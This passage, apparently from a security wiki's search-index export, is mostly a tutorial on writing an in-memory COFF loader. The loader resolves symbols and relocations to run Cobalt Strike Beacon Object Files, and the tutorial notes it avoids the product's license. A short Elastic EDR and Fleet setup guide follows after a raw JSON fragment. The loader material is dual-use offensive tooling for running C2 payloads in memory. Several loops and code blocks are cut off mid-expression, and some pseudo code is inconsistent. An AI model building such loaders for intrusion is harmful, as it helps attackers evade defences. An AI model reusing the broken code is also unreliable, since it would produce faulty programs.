0x0009 The symbol reference address in the section must be replaced by the 32bits relative address of the symbol from the current section minus an offset of 5 bits Other relocation types exist and are referenced in the Microsoft documentation but they are hardly ever used or only for debugging purpose. Thus only these relocation types will be handled here. Absolute and Relative address In the relocation description, the term absolute and relative address is used. Depending on the relocation type, one or the other must be computed. This part aims to explain the difference between absolute and relative address. The following example could help to see the difference between these two address types. Michel TheHacker lives in a very small city with only one street. The street is one way and Michel lives in the 50th house. When he gives his address to a stranger, he always count the number of houses between his and the beginning of the street. His address is then 50. This is called absolute address. However, when he gives his address to one of his friends living in the same street, he always gives the number of houses between his house and his friend house. Thus, for Robert, a Michel friend, living in the house 12, Michel’s address is 38 as there are 38 houses between his and Michel one's. This is called relative address. In a nutshell, an absolute address allows anyone to reach the destination while a relative address allows only one person to reach the destination. With COFF file, the same principle can be applied. THE symbol absolute address is its address from the file start. A symbol relative address is its address from a given position in the file (the relocation address for example). The following figure can help to visualize how to compute the relative addresses : Knowing that, when a relative address is needed, the following formula can be used to compute the symbol relative address of a symbol from a section start: // Compute the relative address of a symbol from a given section RelativeAddress(Symbol) = AbsoluteAddress(Symbol) - AbsoluteAddress(Section) The absolute address can be easily computed with the following formula: AbsoluteAddress(Symbol) = AbsoluteAddress(SymbolTable) + Offset(Symbol in SymbolTable) These addresses can then be written in the corresponding section. Symbol Table This table contains all the data related to the symbols. It includes their name, type and storage addresses. The following C structure can be used to handle each symbol entry: typedef struct _CoffSymbol { union { char name[8]; uint32_t value[2]; } first; uint32_t value; uint16_t sectionNumber; uint16_t type; uint8_t storageClass; uint8_t numberOfAuxSymbols; } CoffSymbol; The first value is a union. It can handle two types of data depending on the symbol: The symbol name is fewer than 8 characters : the first.name value will contain the name of the symbol The symbol name is greater than 8 characters : the first.name[0] will be equal to 0 and the first.value will contains the offset of the symbol name in the Symbol Sting Table. When the name is greater than 8 characters, the full-symbol name can be retrieved with the following code: // pseudo code char *name = symbolStringTable + coffSymbol.first.value The value value is the symbol value. This entry can have different meanings depending on the symbol storage class. The sectionNumber value is the section index where the symbol data is stored. The type value is the type of the symbol ie the type of the value it represents. For example, it could be DT_CHAR, DT_INT, DT_FUNCTION. Usually, this field is not really used and is either DT_FUNCTION or 0. The storageClass value represents how the data is actually stored in this symbol. The following table contains the main possible values and their specificities: Name Value Description IMAGE_SYM_CLASS_NULL 0x0 No storage type IMAGE_SYM_CLASS_NULL_AUTO 0x01 auto type. It is usually used for auto-allocated values stored in the stack IMAGE_SYM_CLASS_EXTERNAL 0x02 The symbol is defined in another COFF object. If the section number is 0, the symbol's value represent the symbol size, otherwise it represents the symbol offset within its section IMAGE_SYM_CLASS_STATIC 0x03 The symbol defined a static value. If the symbol's value is not 0, it represents the symbol offset within its section Thus, if the symbol storage class is either IMAGE_SYM_CLASS_STATIC or IMAGE_SYM_CLASS_EXTERNAL with a non 0 section index, the symbol address can be computed as follows: // pseudo code void *symbolAddress = sections[coffSymbol.sectionIndex].pointerToRawData + coffSymbol.value; Finally, the numberOfAuxSymbols represents the number of auxiliary symbols that are contained right after the symbol record. These auxiliary symbols are usually linker specific and thus can be ignored for now as the COFFLoader does not link different object files to one another. They give additional information about the linked symbol. For example, in case of a symbol defining a function, the additional symbol can contain information about the total size of the function. This additional information is not really needed for the COFFLoader. Symbol Table String This table just contains the name of the symbols This table is used to resolve symbols' name whose size is greater than 8 characters (see previous section about Symbol Table) Conclusion So now, all information is given to allow anyone to easily parse a Windows COFF file. It is possible to retrieve the COFF header, iterate through the different sections, retrieve their raw data. It is then possible to parse the relocation tables associated to each section and retrieve all the symbols needed. Time to start mapping all these things in memory. Write sections in memory The sections contain all the interesting data used by the program. Indeed, the compiled code is contained in the .text section and the variable in the .XXXdata sections. The first thing to do is to parse all these sections and map them in memory. This can be done with the following code: // pseudo code // void *data : represent the first byte of the COFFFile // void **sectionAddressMemory : table that will store section's allocated memory address // Retrieve the header and fill the CoffHeader structure. In C a simple cast does the job. CoffHeader *coffHeader = (COFFHeader *)data for(size_t i = 0; i numberOfSections; i++){ // Get the current section CoffSection *section = (CoffSection *)(data + HEADER_SIZE + SECTION_SIZE * i); // Allocate the memory sectionAddressMemory[i] = VirtualAlloc(section->sizeOfRawData); // Write section data in the allocated memory CopyMemory(sectionAddressMemory[i], data + section->pointerToRawData, section->sizeOfRawData); } So now, all sections are mapped in memory. The relocations can be performed directly in memory. Perform relocations Once the sections are mapped in memory, each relocation entry must be parsed and performed in order to map the symbol address in the section code. The idea is to replace the current section code : 000000000000001B: 48 8D 0D 00 00 00 00 lea rcx,[??_C@_0M@KPLPPDAC@Hello?5World@] 0000000000000022: E8 00 00 00 00 call __imp_printf By 000000000000001B: 48 8D 0D XX XX XX XX lea rcx,[??_C@_0M@KPLPPDAC@Hello?5World@] 0000000000000022: E8 YY YY YY YY call __imp_printf Where XX XX XX XX points to the ??_C@_0M@KPLPPDAC@Hello?5World@ definition address and YY YY YY YY point to the printf definition address. The relocation of external functions such as printf are quite special. Thus, symbols will be separated in two categories : Standard symbols : symbol whose relocation can be directly performed such as standard initialized variable or internal functions Special symbols : symbol that must be pre-processed before being rellocated such as uninitialized variable or external functions. Special symbol The special symbols are symbols that could not be easily resolved through lookup in the different COFF file sections. For example, an internal function funct1, that is defined directly in the C file used to generate the COFF file will have all its body contained in a section (usually the .text section). Its symbol can thus be resolved through a simple lookup at the right COFF section. However, what happens for functions defined in an external library such as the printf function ? External functions External functions are all functions that are not directly defined in the C source file used to generate the COFF file. These function symbols definition do not point to a valid section in the COFF file: This figure shows that the sectionNumber for this symbol is 0. Thus, it cannot be resolved as it will not be possible to find its address in one of the COFF section. This is where the Global Offset Table saves the day. This table can be seen as a made-up section that is generated at run time. This section is used to reference address to functions defined in shared libraries or DLL and serves as a lookup table. For example, the printf function is defined in the MSVCRT Windows library. During the runtime, the OS will search the printf function address in the MSVCRT library (* with GetProcAddress for example) and fill the GOT with this address. When the program tries to access the printf function, it will point on the GOT and gets the address previously fetched by the system. The idea is to simulate this process. First a new section will be allocated in memory: //pseudo code void *got = VirtualAlloc(1024); The printf function is resolved using GetModuleHandle and GetProcAddress to retrieve the function address in the library. Then the address is copied in the GOT section previously allocated and resolve the __imp_printf to the GOT address. // pseudo code void *printfAddress = GetProcAddress(GetModuleHandle(\"MSVCRT\"), \"printf\"); void *nextFreeGotSlot = got + gotSize * 0x08; CopyMemory(nextFreeGotSlot, &printfAddress, sizeof(uint64_t)); gotSize += 1; void *absoluteSymbolAddress = nextFreeGotSlot; From now, the absoluteSymbolAddress will be used as the absolute address to the __imp_printf symbol definition. This is equivalent to modify the CoffSymbol structure by changing the sectionNumber from 0 to .got and filling the .got section with resolved function addresses. Uninitialized variables When a global un-initialized variable is defined in the source code, its symbol is created in the COFF file. However, as it is uninitialized, its value is not mapped in any sections. Usually, this variable will end in the .bss section that is created at run time. The idea is to create a new section that will emulate the .bss section. //pseudo code void *bss = VirtualAlloc(1024); The un-initialized symbols will then be resolved on an addresse contained in the newly created .bss section as the external functions are in the .got section. However, for the functions in the .got , the symbol size is always the same : the size of the function address. For symbols resolved in the .bss , the size is the variable size. For example, a uint32_t symbol will ne take the same space in the .bss as a uint64_t symbol. Likewise, a char[10] will take twice the space used by a char[5]. Hopefully, the size of the symbol is given in the symbolic value attribute in its CoffSymbol structure. In this example, the plop symbol represents an initialized variable whose size is 0x0B bytes. This information can be used to allocate enough space for each symbol. // pseudo code // void *bss : the allocated address for the .bss section // size_t bssOffset : the size already used in the .bss section size_t symbolSize = coffSymbol->value; void *absoluteSymbolAddress = bss + bssOffset; // The next symbol will be resolved after the current one in the .bss bssOffset += symbolSize; Then, each time the un-initialized variable symbol is referenced, it will be resolved to the absoluteSymbolAddress address. This is equivalent to modify the CoffSymbol structure by changing the sectionNumber from 0 to .bss and modifying the value field with the .bss offset used. Detect and process special symbols The whole game is to be able to make the difference between a standard symbol that can be directly relocated and a non-standard symbol that must be pre-processed before being relocated. The non-standard symbols are, actually, the symbols that cannot be resolved directly in the COFF file. This feed through having an undefined section index (sectionNumber value set to 0 in the CoffSymbol structure) and having the IMAGE_SYM_CLASS_EXTERNAL storage class. // pseudo code if(coffSymbol->storageClass == IMAGE_SYM_CLASS_EXTERNAL && coffSymbol->sectionIndex == 0){ // process non standard symbol } Once the non-standard symbol is detected, the difference between an external function and an un-intialized variable must be done. The external function symbols' name is quite recognizable as it always starts with __imp_. If the symbol name starts with this pattern, it could be assumed it represents a function. //pseudo code char* symbolName = resolveSymbolName(coffSymbol); if(strncmp(symbolName, \"__imp_\", 6) == 0){ // process the function } else{ // process the uninitialized variable } The un-initialized variable symbol processing is quite straight forward, but for functions it requires more work. Indeed, in order to resolve the function in its shared library, the library name and the function name must be known. However, in a common COFF file the function symbol only contains the function name (ie __imp_printf). This can be solved through the Dynamic Function Resolution convention. The DFR set a specific syntax for external function definition and name. The following code shows the Hello world program using DFR: DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char* test, ...); int main(void){ MSVCRT$printf(\"Hello World !\\n\"); } In this convention, the library name is added to the function name. After compilation, the printf symbol will look like __imp_MSVCRT$printf. This syntax solve all the problems as the shared library named is included in the symbol name. The function can then be resolved like this: // pseudo code // char* symbolName : the symbol name // Remove the __imp_ symbolName += 6; char *splittedName = symbolName.split('$'); char *libraryName = splittedName[0]; char *functionName = splittedName[1]; void *functionAddress = GetProcAddress(GetModuleHandle(libraryName), functionName); Thus, when writing BOF the DFR convention must be followed. To avoid heavy syntax, a simple typedef can be performed: DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char* test, ...); typedef printf MSVCRT$printf int main(void){ printf(\"Hello World !\\n\"); } Conclusion From now, all symbols represented in the COFF file can be resolved to an address in memory. The functions will be resolved to the newly created .got section and the un-initialized variable will be resolved to the new created .bss section. They can then be processed as standard symbols as long as their definition address used during the relocation is the one pointing to the .got or the .bss. Finally, the functions address can be resolved through the GetModuleHandle and GetProcAddress thanks to the Dynamic Function Resolution convention. Let's remap the symbol in the section ! Standard symbol relocation These symbols can be relocated quite easily. In order to perform the relocation three information are needed: The relocation type : to know in wich format (relative or absolute) the symbol address must be given The symbol reference address : to know where in the section the symbol address must be written The symbol definition address : to know where the computed symbol reference address must point Relocation type The relocation type can be easily retrieved in the CoffReloc structure. Symbol reference address The symbol reference address represents the first byte in the section that must be rewritten with the symbol definition address. It can be computed from the information contained in the current CoffSection and CoffReloc structure with the following formula: // pseudo code // int i : index of the currently processed section void *symbolRefAddress = sectionAddressMemory[i] + coffReloc.virtualAddress This address is the copy destination. Symbol definition address That is where the fun begins. Indeed, depending on the relocation type and the symbol storage type this address is computed differently. The relocation type gives indication of the address positioning type expected by the section ie absolute or relative address. The symbol storage type gives indication about how the symbol offset can be found. In this part, the main relocation type will be studies. Other relocation type can be found in COFF files but they will mainly be used for debugging or could be easily transcribed from the indication written here. IMAGE_REL_AMD64_ADDR64 Positioning : Absolute Address size : 64bit Complexity : Easy Start with an easy one. This relocation type indicates an absolute positioning. The symbol address computed is expected to directly point on the symbol address if the start point is the address 0x0. The ADDR64 part of the relocation type shows that a 64bit address is expected by the section. The symbol definition address can simply be computed with the following formula: //pseudo code // void *symbolOffset : the symbol offset in its definition section // CoffSymbol *coffSymbol : the current symbol uint64_t symbolDefAddress = (uint64_t)symbolOffset + (uint64_t)sectionAddressMemory[coffSymbol->sectionIndex]; The symbolOffset computation method will be seen later. The value can then be copied at the address pointed by the symbol reference address computed earlier. CopyMemory(symbolRefAddress, &symbolDefAddress, sizeof(uint64_t)); IMAGE_REL_AMD64_ADDR32NB Positioning : Relative Address size : 32bit Complexity : Medium A little bit trickier. This relocation type indicates a relative positioning. The symbol address computed is expected to directly point on the symbol address if the start point is the previously computed symbol reference address. Looking at the figure explaining the difference between absolute and relative address, this symbol definition can be computed with the following formula: //pseudo code // void *symbolOffset : the symbol offset in its definition section // CoffSymbol *coffSymbol : the current symbol uint64_t absoluteSymbolAddress = (uint64_t)symbolOffset + (uint64_t)sectionsAddress[coffSymbol->sectionNumber] uint32_t relativeSymbolDefAddress = (uint32_t)(absoluteSymbolAddress - (symbolRefAddress + 4)) This value can then be copied at the address pointed by the symbol reference address computed earlier. CopyMemory(symbolRefAddress, &relativeSymbolDefAddress, sizeof(uint64_t)); IMAGE_REL_AMD64_ADDR_REL32_X Positioning : Relative Address size : 32bit Complexity : Medium Like the previous one, buuuuuuut not really. There are 6 relocation type starting with IMAGE_REL_AMD64_ADDR_REL32 : IMAGE_REL_AMD64_ADDR_REL32 IMAGE_REL_AMD64_ADDR_REL32_1 IMAGE_REL_AMD64_ADDR_REL32_2 IMAGE_REL_AMD64_ADDR_REL32_3 IMAGE_REL_AMD64_ADDR_REL32_4 IMAGE_REL_AMD64_ADDR_REL32_5 All these relocation types can be handled with the same formula. The _X at the end of the name represents a little offset of X byte that must be subtracted to the relative symbol definition address computed. All these relocation can be handled with the same generic formula: //pseudo code // void *symbolOffset : the symbol offset in its definition section // CoffSymbol *coffSymbol : the current symbol uint64_t absoluteSymbolAddress = (uint64_t)symbolOffset + (uint64_t)sectionsAddress[coffSymbol->sectionNumber] uint32_t relativeSymbolDefAddress = (uint32_t)(absoluteSymbolAddress - (coffReloc->type - 4) - (symbolRefAddress + 4)) This value can then be copied at the address pointed by the symbol reference address computed earlier. CopyMemory(symbolRefAddress, &relativeSymbolDefAddress, sizeof(uint64_t)); Compute symbol offset As shown in the previous part, the symbol offset is a value needed to compute either absolute or relative symbol definition address. Depending on the symbol's storage class, this offset can be computed in different ways. Compute standard symbol's offset The standard way to retrieve the symbol offset is by looking at the last byte of the value pointed by the address stored in the relocation structure. // pseudo code // void **sectionAddressMemory : table that stores section allocated memory address uint32_t symbolOffset = *(sectionAddressMemory[i] + coffReloc->virtualAddress) Compute STATIC and EXTERNAL symbol's offset The offset computation method is quite different for the symbols whose storage class is either IMAGE_SYM_CLASS_STATIC or IMAGE_SYM_CLASS_EXTERNAL. Indeed, for the IMAGE_SYM_CLASS_STATIC symbols, the offset is contained in the CoffSymbol structure's value field if different than 0. Otherwise, the computation method fallback to the default one explained in the previous part. For the IMAGE_SYM_CLASS_EXTERNAL symbols, the offset is also contained in the CoffSymbol structure's value field if the symbol sectionNumber is not 0. Otherwise, the computation method fallback to the default one explained in the previous part. // pseudo code uint32_t symbolOffset; if ((coffSymbol->storageClass == IMAGE_SYM_CLASS_STATIC && coffSymbol->value != 0) || (coffSymbol->storageClass == IMAGE_SYM_CLASS_EXTERNAL && coffSymbol->sectionNumber != 0x0)) { // With static class symbol, the offset is given through the symbol->value (if not 0) // and not in the segment symbol address last bytee symbolOffset = coffSymbol->value; } else { // For standard symbol, the offset is given as the last byte of the // value pointed by the symbol reference address in the section. CopyMemory(&segmentOffset, symbolReferenceAddress, sizeof(uint32_t)); } Yey ! It is now possible to compute all addresses needed to perform the symbol relocation. Put things altogether In order to perform all relocation, the different section must be parsed, their relocation table retrieved and applied. The following code can be used as a template: // pseudo code // void *data : the address of the first COFF byte CoffHeader *coffHeader = (coffHeader *)data for(size_t i = 0; i numberOfSections; i++){ // parse all the sections CoffSection *coffSection = data + HEADER_SIZE + SECTION_SIZE * i; // parse all the relocations for the given section for(size_t j = 0; j numberOfRelocations; j++){ // get the current relocation to process CoffReloc *coffReloc = data + coffSection->pointerToRelocations + RELOC_SIZE * j; // get the symbol related to the relocation CoffSymbol *coffSymbol = data + coffHeader->pointerToSymbolTable + SYMBOL_SIZE * coffReloc->symbolTableIndex void *symbolDefAddress; if(isNonStandardSymbol(coffSymbol)){ if(isExternalFunctionSymbol(coffSymbol)){ // resolve the function // add the function address in the .got // return the got address pointing to the resolved function symbolDefAddress = resolveAndAddToGot(coffSymbol); } else{ // create a new entry in the .bss // return the address pointing to the new entry in the .bss symbolDefAddress = addBssEntry(coffSymbol); } } else{ // Compute the symbol absolute address symbolDefAddress = getSymbolOffset(coffSymbol) + sectionsAddress[coffSymbol->sectionNumber] } // Compute the address expected by the section // Write it in the section processRelocation(coffSymbol, symbolDefAddress, coffReloc->type); } } So now all the sections can point to the right address and reach their symbols. The program can be run without trying to reach an undefined address such as 0x00000000. Run the code Now all symbols are resolved, it is possible to run the code linked in memory. This can be done in three simple steps: Retrieve the symbol address related to the function to run (the function main(int argc, char **argv) for example) Cast the address to a function prototype Run the function This can be done with the following code: //pseudo code // void **sectionAddressMemory : table that stores section allocated memory address for(size_t i = 0; i numberOfSymbols; i++){ CoffSymbol *coffSymbol = (CoffSymbol *)(data + coffHeader->pointerToSymbolTable + SYMBOL_SIZE * i); char *symbolName = resoleSymbolName(coffSymbol); // find the symbol related to the main function if(strcmp(symbolName, \"main\") == 0){ // define the function prototype int(* function)(int argc, char **argv); // cast the symbol address into a function function = int(*)(int, argv **)(sectionAddressMemory[coffSymbol->sectionIndex] + coffSymbol->value) // run the function with its arguments function(argc, argv); } } If all relocations have been successfully performed, the function should run smoothly ! Yey ! Here is your CoffLoader ! Upgrade Compatibility with CobaltStrike BOF The current COFFLoader will be unable to run standard CobaltStrike BOF. Indeed, the CobaltStrike BOF use specific API that allows it to communicate with the beacon. This communication is mandatory as CobaltStrike beacons need to be able to retrieve the COFF result to send it back to the operator. CobaltStrike BOF specificities The CobaltStrike documentation shows several API that can be used in the BOF to communicate with the beacon. The following functions can be used in the BOF code: Category Function Name Description Argument Parsing BeaconDataParse Initialize the BOF argument parser Argument Parsing BeaconDataInt Extract int from arguments Argument Parsing BeaconDataShort Extract short from arguments Argument Parsing BeaconDataLength Get arguments string length Argument Parsing BeaconDataExtract Extract string from arguments Response Formatting BeaconFormatAlloc Allocate memory to format large output Response Formatting BeaconFormatReset Resets format object to its default state Response Formatting BeaconFormatFree Free the format object Response Formatting BeaconFormatAppend Append data to the format object Response Formatting BeaconFormatPrintf Append formatted data to the the object Response Formatting BeaconFormatToString Return the object as a string Response Formatting BeaconFormatInt Append a 4bytes big endian integer to the object Response Formatting BeaconPrintf Format and send the output to the beacon Response Formatting BeaconOutput Send output to the beacon Advanced Operation BeaconUseToken Apply the specified token as Beacon's current thread token Advanced Operation BeaconRevertToken Drop the current thread token Advanced Operation BeaconIsAdmin Return true if the beacon is in high integrity Advanced Operation BeaconGetSpawnTo Populate the specified buffer with the x86 or x64 spawnto value configured for this Beacon session Advanced Operation BeaconSpawnTemporaryProcess Spawn en temporary process Advanced Operation BeaconInjectProcess Inject payload in the specified process Advanced Operation BeaconInjectTemporaryProcess This function will inject the specified payload into a temporary process that the BOF opted to launch through Advanced Operation BeaconCleanupProcess Cleanup handles Advanced Operation toWideChar Convert the src string to a UTF16-LE wide-character string, using the target's default encoding These API are not supported by the CoffLoader out of the box. They must be implemented in the CoffLoader code. CobaltStrike furnishes a header file that can be used to compile BOF. This header file can be used as a base to rebuild the API that will be integrated in the COFFLoader. TrustedSec starts to implement several of these API in C. The file can be found here. Once these API are implemented, they must be accessible to the COFF file launched by the COFFLoader. Unlike functions available in shared libraries, it will not be possible to use GetProcAddress to resolve these functions. Add support for beacon internal functions In order to be able to resolve the CobaltStrike API functions symbols used in the COFFfile, the easiest way is to collect all functions address in an array and use these addresses while resolving the symbols. // pseudo code unsigned char **internalFunctions = { {(unsigned char*)\"BeaconDataParse\", (unsigned char*)BeaconDataParse}, {(unsigned char*)\"BeaconDataInt\", (unsigned char*)BeaconDataInt}, {(unsigned char*)\"BeaconDataShort\", (unsigned char*)BeaconDataShort}, }; Then, in the function used to resolve functions address it is possible to check whether the function to resolve is one of the internal functions or an function stored in shared librairies. The internal function can be differentiated from shared libraries as their DFR name will not show any external library : DECLSPEC_IMPORT void BeaconDataParse(datap * parser, char * buffer, int size); Thus, the generated symbol will not contain any shared library name to look at. In this case, the internalFunctions array can simply be looped over while the function name is not found. Once the right entry is found, the address related to the function can be added to the .got section. // pseudo code // char *functionSymbolName : function symbol name in DFR resolution void *functionAddress = NULL; char **symbolSplitted = functionSymbolName.split('$'); if(strlen(symbolSplitted[1]) == 0){ // The symbol represents an internal function char *functionName = symbolSplitted[0]; // loop through defined internal functions for(size_t i = 0; i The COFF will then be able to resolve internal functions symbols and communicate with the COFFLoader process for, as an example, returning execution results through the BeaconPrintf function. This method can be applied to any function defined in the COFFLoader code. Format parameters for CobalStrike BOF The parameters given to ColbaltStrike BOF must be formatted in a given way. Indeed, the BeaconAPI used by CobaltStrike BOF expects the parameters to be formatted in a given way. All parameters must be given as a single string String parameters are expected to be a length prefixed binary blob Number parameters are not length prefixed (as their type define their length) The whole parameter string is expected to be a length prefixed binary blob Length prefixes are a 4-byte values Thus, if your BOF expects two parameters (one string and one integer), they must be sent as follows : // each length is in bytes : length(\"hello world\") = strlen(\"hello world\") * sizeof(char) ${totalLength}${stringArgumentLength}${stringArgument}${intArgument} The following C code can be used to format a list of parameters as a CobaltStrike parameter string: typedef struct _Arg { void* value; // the useful argument value size_t size; // the size in byte of the value BOOL includeSize; // is the value must be given as length-prefixed } Arg; void PackData(Arg* args, size_t numberOfArgs, char** output, size_t* size) { uint32_t fullSize = 0; for (size_t i = 0; i Dynamic .got and .bss The VirtualAlloc call used to allocate the .got and .bss section uses a static predefined size of 1024 bytes. If there are more than 1024 bytes of function pointers or initialized data that must be defined during the symbol resolution, the CoffLoader will crash during the COFF linking time. Indeed, it will try to write symbol data in un-allocated memory in the .bss or the .got. To avoid using fixed size .got and .bss sections, it is possible to pre-calculate their sizes by looking at all the symbols before allocating the memory. This method is quite effective but it will ask the CoffLoader to enumerate and resolve twice the symbols : a first one to calculate the section size, the second one to resolve and relocate the symbols. To avoid this unnecessary double lookup, it is possible to save the resolved symbols during the first processing and then reuse the values for the relocation. The following structures can be used to save the pre-resolved symbols: typedef struct _BssEntry { void* symbol; // address of the current processed symbol uint64_t bssOffset; // offset of the resolved symbol in the .bss } BssEntry; typedef struct _GotEntry { void* symbol; // address of the current processed symbol void* function; // address of the resolved function (GetProcAddress or internal function) uint64_t gotOffset; // offset of the resolved symbol in the got } GotEntry; These structures are filled up before the .got and .bss section allocation: // pseudo code size_t bssOffset = 0; size_t gotSize = 0; // loop over each symbols for (uint32_t i = 0; i numberOfSymbols; i++) { // get the current symbol CoffSymbol* coffSymbol = (CoffSymbol*)((uint64_t)symbols + (uint64_t)i * SYMBOL_SIZE); if(isUninitializedVariable(coffSymbol)){ // save the symbol information bssSymbols.append({ .symbol = coffSymbol, .bssOffset = bssOffset }); // extend the futur .bss section size bssOffset += coffSymbol->value; } else if(isExternalFunction(coffSymbol)){ // get the external function address through GetProcAddress // or in the internalFunctions array void *functionAddress = resolveExternalFunction(coffSymbol); // save the symbol information gotSymbols.append({ .symbol = symbol, .function = functionAddress, .gotOffset = gotOffset }); // extend the futur .got section size gotOffset += 0x08; } } // allocate the sections with the right size void *got = VirtualAlloc(gotSize); void *bss = VirtualAlloc(bssSize); Then, when relocation must be performed, these structures can be looked up to retrieve the pre-assigned offset in the .bss or .got and use these values as the absolute symbol definition address without re-resolving the symbol. // pseudo code // changes of the code used to perfom the relocation [...] if(isNonStandardSymbol(coffSymbol)){ if(isExternalFunctionSymbol(coffSymbol)){ // loop through the pre-resolved symbols for(size_t i = 0; i So now, your CoffLoader is able to process COFF files with undefined number of external functions and initialized variables. And as usual, Yey ! Conclusion That was a long journey. After writing all of this, it looks like nothing is really complicated and I'm beginning to ask myself why it needs any explanation. The design of a CoffLoader does not contain any complex concept. Everything is simple and quite obvious once the COFF specification is well understood... So now, you should, too, think that the subject is simple and the loader can be easily implemented. I hope it is the case. At the end of this article, you should understand how PE specification work and how to easily programmatically navigate through all this information. The PE format has not been seen in depth and several interesting parts are missing from this article (such as the PEB and all the secrets it contains) but it was not really the goal of the article. However, you should master the COFF specification for Windows Object. You should be able to easily find all the information you need in these files as well as being able to map them in memory. Likewise, the principle of relocation should not have any secret for you anymore. When someone will ask you why the hell my PE is performing relocation or why my linker tells me it cannot find the XXXX symbol you should be able to explain it to him, in more details he wanted, why his code sucks. All of these theoretical knowledge should have helped you to develop the CoffLoader in its most advanced shape in order to run CobaltStrike BOF without needing to pay for the CobaltStrike license. Likewise, if you use CobaltStrike and do not need to implement any CoffLoader, this article should have been quite an interesting lecture as now you know exactly how all of it works and even gave you some basis to start writing your own BOF files. In a personal point of view, I found the journey interesting and it helped me to deeply understand how Windows PE works and how the Object Files can be used to generate Windows binaries. I hope you liked this article and do not think it was a complete waste of time. Ressources https://www.trustedsec.com/blog/coffloader-building-your-own-in-memory-loader-or-how-to-run-bofs/ https://blog.katastros.com/a?ID=00100-b060e132-0540-4c53-8527-bf45b2964215 "},"Malware/Elastic EDR.html":{"url":"Malware/Elastic EDR.html","title":"Elastic EDR","keywords":"","body":"Elastic EDR Table of content Install Elastic search Kibana Beats X-PACK Generate certificates Configure SSL Authentication Elastic EDR Enroll an agent Add the EDR Add Sysmon Sysmon Winlogbeats Install wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - sudo apt-get install apt-transport-https echo \"deb https://artifacts.elastic.co/packages/8.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-8.x.list Elastic search apt-get install elasticsearch In /etc/elasticsearch/elasticsearch.yml : Set the network.host value with the server IP address Give name to your nodes with node.name and cluster.initial_master_nodes Then restart elastic: service elasticsearch start service elasticsearch status Reset the elastic password : /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic Kibana apt-get install kibana In /etc/kibana/kibana.yml: Set the server.host value with the server IP address Set the elasticsearch.hosts value with the elasticsearch IP Restart Kibana: service kibana start Beats apt install filebeat X-PACK X-PACK is used to handle SSL and security parameters. Generate certificates Create the /usr/share/elasticsearch/instances.yml file with the following content: instances: - name: \"elasticsearch\" ip: - \"192.168.253.18\" - name: \"kibana\" ip: - \"192.168.253.18\" - name: \"zeek\" ip: - \"192.168.253.18\" Generate the AC certificate with : bin/elasticsearch-certutil ca -pem Generate the instances certificates with: bin/elasticsearch-certutil cert -ca-cert ca/ca.crt -ca-key ca/ca.key -pem -in instances.yml --out certs.zip Where ca.key and ca.crt are the AC certificate generated before. Copy the certificates in the elasticsearch, kibana and beats directories: unzip certs.zip mkdir -p /etc/elasticsearch/certs mv elasticsearch/* /etc/elasticsearch/certs cp ca/ca.crt /etc/elasticsearch/ca.crt chown -R elasticsearch: /etc/elasticsearch/certs chmod -R 770 /etc/elasticsearch/certs mkdir -p /etc/kibana/certs mv kibana/* /etc/kibana/certs cp ca/ca.crt /etc/kibana/ca.crt chown -R kibana: /etc/kibana/certs chmod -R 770 /etc/kibana/certs mkdir -p /etc/filebeat/certs mv zeek/* /etc/filebeat/certs cp ca/ca.crt /etc/filebeat/ca.crt chmod 770 -R /etc/filebeat/certs Configure SSL In /etc/elasticsearch/elasticsearch.yml: # Transport layer xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.key: /etc/elasticsearch/certs/elasticsearch.key xpack.security.transport.ssl.certificate: /etc/elasticsearch/certs/elasticsearch.crt xpack.security.transport.ssl.certificate_authorities: [ \"/etc/elasticsearch/certs/ca.crt\" ] # HTTP layer xpack.security.http.ssl.enabled: true xpack.security.http.ssl.verification_mode: certificate xpack.security.http.ssl.key: /etc/elasticsearch/certs/elasticsearch.key xpack.security.http.ssl.certificate: /etc/elasticsearch/certs/elasticsearch.crt xpack.security.http.ssl.certificate_authorities: [ \"/etc/elasticsearch/certs/ca.crt\" ] In /etc/kibana/kibana.yml: # The URLs of the Elasticsearch instances to use for all your queries. elasticsearch.hosts: [\"https://192.168.1.232:9200\"] elasticsearch.ssl.certificateAuthorities: [\"/etc/kibana/certs/ca.crt\"] elasticsearch.ssl.certificate: \"/etc/kibana/certs/kibana.crt\" elasticsearch.ssl.key: \"/etc/kibana/certs/kibana.key\" server.ssl.enabled: true server.ssl.certificate: \"/etc/kibana/certs/kibana.crt\" server.ssl.key: \"/etc/kibana/certs/kibana.key\" In /etc/filebeat/filebeat.yml: # Elastic Output output.elasticsearch.hosts: ['192.168.1.232:9200'] output.elasticsearch.protocol: https output.elasticsearch.ssl.certificate: \"/etc/filebeat/certs/zeek.crt\" output.elasticsearch.ssl.key: \"/etc/filebeat/certs/zeek.key\" output.elasticsearch.ssl.certificate_authorities: [\"/etc/filebeat/certs/ca/ca.crt\"] # Kibana Host host: \"https://192.168.1.232:5601\" ssl.enabled: true ssl.certificate_authorities: [\"/etc/filebeat/certs/ca/ca.crt\"] ssl.certificate: \"/etc/filebeat/certs/zeek.crt\" ssl.key: \"/etc/filebeat/certs/zeek.key\" Restart the services : service elasticsearch restart service kibana restart service filebeat restart Authentication In /etc/elasticsearch/ealasticsearch.yml: xpack.security.enabled: true If you don't know the elastic password, just reset it: /usr/share/elasticsearch/bin/elasticsearch-reset-password -u ${username} In /etc/kibana/kibana.yml: # Elastic Credentials xpack.security.enabled: true elasticsearch.username: \"elastic\" elasticsearch.password: \"Your_Elastic_Pass_Here\" In /etc/filebeat/filebeat.yml: # Elastic Credentials output.elasticsearch.username: \"elastic\" output.elasticsearch.password: \"Your_Elastic_Pass_Here\" Restart services: service elasticsearch restart service kibana restart service filebeat restart Check if filebeat can access to elasticsearch: filebeat test config filebeat test output If one on the service does not start, debug it with : journalctl -u elasticsearch.service journalctl -u kibana.service journalctl -u filebeat.service Elastic EDR Enroll an agent Connect to Kibana on port 5601: Go to Fleet Management: Add a new Fleet Server if needed: Default Fleet Server Policy Quick Start Fleet Server Host : https://${kibanaIP}:8220 Generate the service token Launch the Fleet server command on the host you want to enroll On the command, add the following parameter: --fleet-server-es-ca=${path} Where path is the path to the AC ca.crt generated during the ElasticSearch stack deployement. Likewise, add this certificate in the certificate trust store (Trusted Root Certificate Authority in Windows) and modify the local policy to use the certificate: Local Security Policy > Public Key Policies > Certificate Path Validation Settings Set the following parameters: You can launch the command now. 